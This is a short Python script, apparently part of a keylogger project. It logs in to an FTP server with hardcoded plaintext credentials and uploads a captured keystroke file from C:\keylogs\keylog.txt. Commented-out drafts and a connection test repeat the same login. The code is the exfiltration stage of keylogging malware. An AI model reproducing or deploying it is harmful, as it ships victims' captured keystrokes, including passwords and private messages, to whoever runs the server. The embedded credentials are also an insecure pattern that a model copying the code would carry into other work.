

# import ftplib
# # import os

# def upload_file_to_ftp(host, username, password, local_filepath, remote_filename):
#     try:
#         with ftplib.FTP(host, username, password) as ftp:
#             print(f"Connected to {host}. Logging in...")
#             print(ftp.getwelcome())
#             with open(local_filepath, 'rb') as file:
#                 ftp.storbinary(f'STOR {remote_filename}', file)
#                 print(f"Successfully uploaded {local_filepath} as {remote_filename} to the server.")

#     except ftplib.all_errors as e:
#         print(f"FTP error: {e}")
#     except FileNotFoundError:
#         print(f"Error: Local file not found at {local_filepath}")
#     except Exception as e:
#         print(f"An unexpected error occurred: {e}")

# if __name__ == '__main__':
    
#     FTP_HOST = '127.0.0.1'
#     FTP_USER = 'yashbanait'
#     FTP_PASS = 'yash@6123'
#     LOCAL_FILE_PATH = r"C:\\keylogs\\keylog.txt"
#     # LOCAL_FILE_PATH = "keylog.txt"
#     REMOTE_FILE_NAME = 'received.txt' 

#     upload_file_to_ftp(FTP_HOST, FTP_USER, FTP_PASS, LOCAL_FILE_PATH, REMOTE_FILE_NAME)

import ftplib
import os

def upload_file_to_ftp(host, username, password, local_filepath):
    try:
        with ftplib.FTP(host) as ftp:
            ftp.login(username, password)
            print(ftp.getwelcome())

            with open(local_filepath, 'rb') as file:
                remote_name = os.path.basename(local_filepath)
                ftp.storbinary(f"STOR {remote_name}", file)

            print(f"Uploaded as {remote_name}")

    except ftplib.all_errors as e:
        print(f"FTP error: {e}")

if __name__ == '__main__':
    upload_file_to_ftp(
        "127.0.0.1",
        "yashbanait",
        "yash@6123",
        r"C:\keylogs\keylog.txt"
    )



#
# testing the connection with FTP (wing)
#


# import ftplib


# FTP_HOST = ""
# FTP_USER = "yashbanait"
# FTP_PASS = "yash@6123"


# with ftplib.FTP(FTP_HOST, timeout=60) as ftp:
#     ftp.login(FTP_USER, FTP_PASS)
#     ftp.encoding = "utf-8"
#     print(f"Connected to {FTP_HOST}")
#     # Perform operations here
#     # Example: list files
#     print(ftp.nlst())
# # # except ftplib.all_errors as e:
# #     print(f"FTP Error: {e}")
